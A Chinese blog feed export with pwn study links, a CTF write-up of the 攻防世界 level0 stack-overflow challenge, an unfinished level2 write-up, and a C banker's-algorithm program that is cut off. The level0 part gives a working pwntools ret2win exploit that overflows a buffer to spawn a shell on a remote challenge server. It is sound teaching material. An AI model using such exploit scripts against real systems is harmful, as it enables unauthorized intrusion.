        <content type="html"><![CDATA[<p>NX保护  ：<a href="https://blog.csdn.net/weixin_39194641/article/details/101113761">https://blog.csdn.net/weixin_39194641/article/details/101113761</a></p><p>​                   <a href="https://blog.csdn.net/weixin_46711318/article/details/107686188">https://blog.csdn.net/weixin_46711318/article/details/107686188</a></p><p>保护机制：<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a>  *</p><p>C语言函数调用规定：<a href="http://blog.csdn.net/adcxf/article/details/2699323">http://blog.csdn.net/adcxf/article/details/2699323</a>  *</p><p>​                                     <a href="https://blog.csdn.net/hellokandy/article/details/54603055">https://blog.csdn.net/hellokandy/article/details/54603055</a></p><p>kali Linux安装教程：<a href="https://blog.csdn.net/qq_42427971/article/details/112977119">https://blog.csdn.net/qq_42427971/article/details/112977119</a> *</p><p>想抽空看的：<a href="https://www.cnblogs.com/tdyizhen1314/p/4902560.html">https://www.cnblogs.com/tdyizhen1314/p/4902560.html</a></p><p>pwn学习路线：<a href="https://rj45mp.github.io/pwn%E5%AD%A6%E4%B9%A0%E5%8F%91%E5%B1%95%E8%B7%AF%E7%BA%BF/">https://rj45mp.github.io/pwn%E5%AD%A6%E4%B9%A0%E5%8F%91%E5%B1%95%E8%B7%AF%E7%BA%BF/</a> </p><p>​                        <a href="https://www.daimajiaoliu.com/daima/569f0b844656402">https://www.daimajiaoliu.com/daima/569f0b844656402</a> *</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-level2</title>
      <link href="/2021/11/12/level2/"/>
      <url>/2021/11/12/level2/</url>
      
        <content type="html"><![CDATA[<p>首先，我们看看文件的基本信息以及文件开启的保护机制</p><p><img src="image-20211112084610889.png" alt="image-20211112084610889"></p><p>32位文件&amp;栈不可执行保护（NX保护机制），注：No xxx就是未开启该保护</p><p>接着我们用32位ida打开文件：</p><p><img src="image-20211112085034275.png" alt="image-20211112085034275"></p><p>刚打开就看见了调用system()函数的一个函数，但并没有看见/bin/sh，不管它，我们找到main函数看看：</p><p><img src="image-20211112085550145.png" alt="image-20211112085550145"></p><p>不用多提了吧，跟进vulnerable_function()就完事了：</p><p><img src="image-20211112085710607.png" alt="image-20211112085710607"></p><p>ok 136 字符大小的buf数组，以及读入0x100= 256 个字符的read函数，明显的栈溢出题</p><p>先到这吧，下午再写</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-level0</title>
      <link href="/2021/11/11/level0/"/>
      <url>/2021/11/11/level0/</url>
      
        <content type="html"><![CDATA[<h5 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h5><p>首先，将附件拖入Linux虚拟机中，查看一些基本信息：</p><p>$ file [文件名]   （查看基本信息）：</p><p><img src="image-20211111132507774.png" alt="image-20211111132507774"></p><p>此处我们只要知道它是64位文件就行</p><p>接着 $ checksec level0   （查看文件开启的保护机制）：</p><p><img src="image-20211111132702011.png" alt="image-20211111132702011"></p><p>这些保护机制是干嘛的自己去百度了解，或者阅读《CTF权威指南》</p><h6 id="转入正题："><a href="#转入正题：" class="headerlink" title="转入正题："></a>转入正题：</h6><p>将附件拖入64位ida，找到main函数：</p><p><img src="image-20211111121543042.png" alt="image-20211111121543042"></p><p>发现只有一个写函数和一个跟在return后面的函数，我们跟进vulnerable_function：</p><p><img src="image-20211111121559745.png" alt="image-20211111121559745"></p><p>发现该函数中定义了一个128字符大小的字符数组，而后面的read函数最多可读入0x200（16进制）= 512 个字符，这也说明了这题是一道栈溢出题</p><p><img src="image-20211111121943642.png" alt="image-20211111121943642"></p><p>接着跟进buf数组，找到return标志“r”，再用buf的起始偏移地址（-80）减去“r”的偏移地址再取绝对值得 ：0x|-80-8|=0x88（0x表示16进制）=  136，也就是在输入136个冗余字符后，再输入的字符覆盖的地址空间就是这个“r”指向的地址空间，只要我们构造好这串接下来输入的字符串，就能依靠这个“r”将程序跳转到我们想要执行任何位置，使程序从跳转到的地址继续开始执行指令</p><p><img src="image-20211111121626092.png" alt="image-20211111121626092"></p><p>此时我们按下Shift+F12转入String window中看看有没有我们想要找的/bin/sh</p><p><img src="image-20211111123918250.png" alt="image-20211111123918250"></p><p>还真有，那我们跟进去看看：</p><p><img src="image-20211111124116865.png" alt="image-20211111124116865"></p><p>继续跟进callsystem+4↑o：</p><p><img src="image-20211111124215771.png" alt="image-20211111124215771"></p><p>F5切换视图，得知/bin/sh存在于callsystem函数当中：</p><p><img src="image-20211111124252498.png" alt="image-20211111124252498"></p><p>拓宽旁边的Functions window，查看callsystem函数的入口地址（起始地址）：</p><p><img src="image-20211111124406342.png" alt="image-20211111124406342"></p><p>ok，入口地址0x00400596，那么我们构造的payload = ‘a’*136+p64（0x00400596）</p><p>因为这是64位文件所以用p64（），注：32位文件一定要用p32（），64位文件一定要用p64（），64位文件用p32（）的话数据前补0不够会错，32位文件用p64（）的话前补0过多也会错，不过我还没实践过</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                               <span class="comment">#导入pwn模块</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;51403&#x27;</span>)          <span class="comment">#远端连接</span></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0000000000400596</span>))  <span class="comment">#发送数据  </span></span><br><span class="line">io.interactive()                                <span class="comment">#接收交互</span></span><br></pre></td></tr></table></figure><h5 id="个人问题："><a href="#个人问题：" class="headerlink" title="个人问题："></a>个人问题：</h5><p>emm…：</p><p><img src="image-20211111131103896.png" alt="image-20211111131103896"></p><p>上次新手赛的时候我就是因为这远端连接不上的问题导致我连那简单pwn的flag都没拿到，浪费了大量的时间，当时我还以为是举办方的服务器出问题了，现在看来是我的个人PC有问题⊙∀⊙！</p><h5 id="2021-11-11-18-06"><a href="#2021-11-11-18-06" class="headerlink" title="2021/11/11 18:06"></a>2021/11/11 18:06</h5><p>ok，重启了下虚拟机我就能连上远端了。。。。。。要是早点知道就好了。。。。。。</p><p>但愿能进校CTF队吧</p><p><img src="image-20211111180900823.png" alt="image-20211111180900823"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;f0ca5da1cdfb6340b7bf05a37ea6a8cc&#125;</span><br></pre></td></tr></table></figure><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><h6 id="xiaoxiao疑惑"><a href="#xiaoxiao疑惑" class="headerlink" title="xiaoxiao疑惑"></a>xiaoxiao疑惑</h6><p><img src="image-20211111182045681.png" alt="image-20211111182045681"></p><p>这里题目的端口号是50416，跟下面的51403不一样是因为每次创建场景的端口号都是随机的，下面的脚本是我在前一个场景下写的，所以端口号是前一个场景的端口号，与这张图的端口号不一样。</p><p><img src="image-20211111181911372.png" alt="image-20211111181911372"></p><p><img src="image-20211111181922023.png" alt="image-20211111181922023"></p><p>为什么我的脚本里没有打开远端服务器level0文件的操作，只是发送了一串payload就拿到了远端服务器的shell？</p><p>解答：在题目创建题目场景的时候，远端服务器已经启动了level0，并把level0的输入输出绑定到了51403端口，所以我用remote从51403端口接入时就已经是在跟level0交互了</p><h6 id="gdb本地调试："><a href="#gdb本地调试：" class="headerlink" title="gdb本地调试："></a>gdb本地调试：</h6><p>gdb打开附件，在main函数和vulnerable_function函数（字符输入）处打下断点：</p><p><img src="image-20211111133656883.png" alt="image-20211111133656883"></p><p><img src="image-20211111133614544.png" alt="image-20211111133614544"></p><p>注，用地址打断点要用 $ break *[16进制地址]</p><p>首先：$ run运行程序，并停止在第一个断点main函数处，但停在这里没什么用</p><p><img src="image-20211111133956141.png" alt="image-20211111133956141"></p><p>我们使用 $ continue 指令使程序运行至下一断点vulnerable_function函数</p><p><img src="image-20211111134431387.png" alt="image-20211111134431387"></p><p>可以发现那里打印出了一个Hello，World，这是我们执行main函数的过程中打印出来的，由下面的反编译代码可知，main函数中有打印Hello，World的语句</p><p><img src="image-20211111134649152.png" alt="image-20211111134649152"></p><p>然后我们单走三步 $ si :</p><p><img src="image-20211111135202455.png" alt="image-20211111135202455"></p><p>code段出现了 &lt; read@plt &gt;，这对应着我们vulnerable_function函数中的read函数的调用</p><p><img src="image-20211111135316303.png" alt="image-20211111135316303"></p><p>接着我们再单走5步 $ si （前4步使指针指向read，第5步进入read）进入read函数查看，此时刚进入read函数：</p><p><img src="image-20211111140118890.png" alt="image-20211111140118890"></p><p>看到此时栈段的初始地址：</p><p><img src="image-20211111140308756.png" alt="image-20211111140308756"></p><p>使用 $ x/136wx 0x7fffffffdf08    从低地址向高地址打印136个内存地址（不标准术语）：</p><p><img src="image-20211111141422227.png" alt="image-20211111141422227"></p><p>记住此时栈的情况，如上↑</p><p>再使用  $ x/180wx 0x7fffffffdf08    多打印一些栈空间存储情况用以与之后做对比：</p><p><img src="image-20211111141759713.png" alt="image-20211111141759713"></p><h6 id="高能预警："><a href="#高能预警：" class="headerlink" title="高能预警："></a>高能预警：</h6><p>接下来，我们返回ida去找到vulnerable_function函数的末尾地址，为什么要找？因为我们现在的指针刚进入read函数，指着read函数的初始地址，但<strong>我们调试的目的是</strong>要输入字符使输入的字符覆盖栈地址空间，然后查看栈情况看覆盖的地址对不对，而此时的指针位置离我们<strong>可输入字符的那条指令</strong>不知道还有多远（因为假如read函数还调用了其他系统函数的话，就会有很多额外指令，我们单走 $ si 不知道要走多少指令，单走一次 $ si 相当于系统执行一条普通指令，计算机执行指令的速度我在百度上搜了一下，1纳秒左右，不知道对不对，就算我们以1秒执行一次$ si 并查看当前指针位置的速度进行，跟1纳秒一条指令相比，差了10^9个数量级，简言之我们一步 $ si 执行一条指令,计算机相同时间内能执行10^9调指令）所以我们直接找到vulnerable_function函数的末尾地址，计算机在断到这个断点之前一定会先执行<strong>可输入字符的那条指令</strong>（这个可输入字符的指令是在vulnerable_function函数调用中出现的，所以我们执行到vulnerable_function函数的末尾一定会执行到这个可输入字符的指令）</p><p>好吧，废话说多了，现在返回ida找末尾地址：</p><p><img src="image-20211111142824910.png" alt="image-20211111142824910"></p><p>因为我们要找末尾地址，所以我们点击return后按下tab键</p><p><img src="image-20211111142227896.png" alt="image-20211111142227896"></p><p>初始位置自动定位在leave处，leave的英文是什么我好像不知道，反正这就是vulnerable_function函数的末尾地址 0x004005C4</p><p><img src="image-20211111142256638.png" alt="image-20211111142256638"></p><p>现在我们再返回gdb下一个断点 $ break *0x004005c4</p><p><img src="image-20211111142558240.png" alt="image-20211111142558240"></p><p>ok，断点下好了，输入continue继续执行：</p><p><img src="image-20211111145430366.png" alt="image-20211111145430366"></p><p>很好，现在可以输入字符了，但我们要输入136个a，太多了，我们可以用python快速得出：</p><p><img src="image-20211111145641439.png" alt="image-20211111145641439"></p><p>将这136个a字符复制过去，按下回车</p><p><img src="image-20211111145852004.png" alt="image-20211111145852004"></p><p>此时我们再执行  $ x/136wx 0x7fffffffdf08 和  $ x/180wx 0x7fffffffdf08</p><p>先是$ x/136wx 0x7fffffffdf08：</p><p><img src="image-20211111150359331.png" alt="image-20211111150359331"></p><p>诶，我去，我还以为这里全部都会被0x61（字符a的ascll码值）填满，分析了一下，一个字符是十进制的1，而我们$ x/136wx 0x7fffffffdf08 中的136是16进制的136，转成10进制是310，可是我拿打印出的最后地址0x7fffffffe118-0x7fffffffdf08 = 0x210 = 528，懵了懵了</p><p><img src="image-20211111151035567.png" alt="image-20211111151035567"></p><p>好奇怪啊，算了这不是重点，这里不纠结了</p><p>把之前的图拿过来对比一下，之前栈里面是没有0x61616161的：</p><p><img src="image-20211111141422227.png" alt="image-20211111141422227"></p><p>我们继续看栈，这个在覆盖了136个a字符的栈后面第一个东西是什么？是0x0040050a，这跟那些函数的起始地址长得很像不是吗，所以这应该就是一个return调用的地址没错了，<em><strong>也就是说我们构造的payload是没有问题的，得到的这个结论就是gdb调试的意义</strong>，我们之前说的payload = ‘a’</em>136+p64（0x00400596），这个0x00400596就是要把这里0x0040050a覆盖掉的新地址，覆盖以后再执行程序，程序执行到这个return，return到0x0040050a，就能进入system函数（system（”/bin/sh“））拿到shell</p><p><img src="image-20211111151348919.png" alt="image-20211111151348919"></p><p>再重新理一遍本题原理：</p><p>1、找到栈溢出函数（本题main() -&gt; vulnerable_function() -&gt; read()）</p><p>2、覆盖buf相距0x88=136个字符的return的返回地址为带有system（”/bin/sh“）的callsystem的首地址0x00400596</p><p><img src="image-20211111153939572.png" alt="image-20211111153939572"></p><p><img src="image-20211111154115024.png" alt="image-20211111154115024"></p><p><img src="image-20211111154230809.png" alt="image-20211111154230809"></p><p>3、写好脚本就行</p><p><img src="image-20211111154428348.png" alt="image-20211111154428348"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                               <span class="comment">#导入pwn模块</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;51403&#x27;</span>)          <span class="comment">#远端连接</span></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0000000000400596</span>))  <span class="comment">#发送数据  </span></span><br><span class="line">io.interactive()                                <span class="comment">#接收交互</span></span><br></pre></td></tr></table></figure><p>写得好累，不过把基础知识打牢了很多，还行吧</p><p>不知道我的文字描述别人看起来感觉怎么样，反正我自己看得有些吃力</p><p>对了，如果发现有错误，欢迎指正（wx：xy1724252720）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>银行家算法</title>
      <link href="/2021/11/07/banker/"/>
      <url>/2021/11/07/banker/</url>
      
        <content type="html"><![CDATA[<p>感觉自己写得还不错，在这保留一下源代码吧 ^_^</p><p>操作系统书P172</p><p>原理：</p><p>1、占据资源全为0的进程不会造成死锁，做标记</p><p>2、循环判定、做标记&amp;计算</p><p>3、若所有进程都有标记，说明无死锁；反之存在死锁</p><h4 id="简洁版："><a href="#简洁版：" class="headerlink" title="简洁版："></a>简洁版：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">to1:</span><br><span class="line">start();</span><br><span class="line"><span class="keyword">if</span>(end())<span class="keyword">goto</span> to1;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//基本数据输入： </span></span><br><span class="line"><span class="keyword">int</span> b,i,j,k,m,n,f;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入进程个数n：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入资源维数m：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line"><span class="keyword">int</span> A[n][m],C[n][m],B[n][m],a[m],flag[n]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需求矩阵C：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;C[i][j]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分配矩阵A：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123; </span><br><span class="line">    f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i][j]);</span><br><span class="line"><span class="keyword">if</span>(A[i][j]==<span class="number">0</span>)f++;<span class="comment">//记录分配矩阵中一个进程中各维元素为0的个数 </span></span><br><span class="line">B[i][j] = C[i][j]-A[i][j];<span class="comment">// B 为 C-A 伴随矩阵 </span></span><br><span class="line"><span class="keyword">if</span>(f==m)flag[i]=<span class="number">1</span>;<span class="comment">//若全为0，则做标记 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**------------------------------------------------------------------------------- </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入可用资源量a：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;m;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//矩阵计算：</span></span><br><span class="line">b = n+<span class="number">1</span>;</span><br><span class="line">to2:</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"> f = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">if</span>(flag[i]==<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//若该程序有标记则跳过该程序 </span></span><br><span class="line"> <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(a[j]&gt;=B[i][j])f++;</span><br><span class="line"> <span class="keyword">if</span>(f==m)&#123;</span><br><span class="line"> flag[i]=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line"> a[k] += A[i][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(b--)<span class="keyword">goto</span> to2;<span class="comment">//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判定标记：</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>)f++;</span><br><span class="line"><span class="keyword">if</span>(f==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;存在死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n是否继续进行下一组测试？[Y/N]:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*--------------------------------------------------------------------------------*\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;Y&#x27;</span> || ch == <span class="string">&#x27;y&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="测试条件未删减版："><a href="#测试条件未删减版：" class="headerlink" title="测试条件未删减版："></a>测试条件未删减版：</h4><p>运行情况如下：</p><p><img src="image-20211107154126239.png" alt="image-20211107154126239"></p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">to1:</span><br><span class="line">start();</span><br><span class="line"><span class="keyword">if</span>(end())<span class="keyword">goto</span> to1;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//基本数据输入： </span></span><br><span class="line"><span class="keyword">int</span> b,i,j,k,m,n,f;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入进程个数n：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入资源维数m：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line"><span class="keyword">int</span> A[n][m],C[n][m],B[n][m],a[m],flag[n]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需求矩阵C：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;C[i][j]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/*    printf(&quot;\n矩阵C存储情况：\n&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">for(j = 0;j&lt;m;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d &quot;,C[i][j]);</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分配矩阵A：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123; </span><br><span class="line">    f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i][j]);</span><br><span class="line"><span class="keyword">if</span>(A[i][j]==<span class="number">0</span>)f++;<span class="comment">//记录分配矩阵中一个进程中各维元素为0的个数 </span></span><br><span class="line">B[i][j] = C[i][j]-A[i][j];<span class="comment">// B 为 C-A 伴随矩阵 </span></span><br><span class="line"><span class="keyword">if</span>(f==m)flag[i]=<span class="number">1</span>;<span class="comment">//若全为0，则做标记 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;\n矩阵A存储情况：\n&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">    for(j = 0;j&lt;m;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d &quot;,A[i][j]);</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;\n矩阵B存储情况：\n&quot;);</span></span><br><span class="line"><span class="comment">for(i = 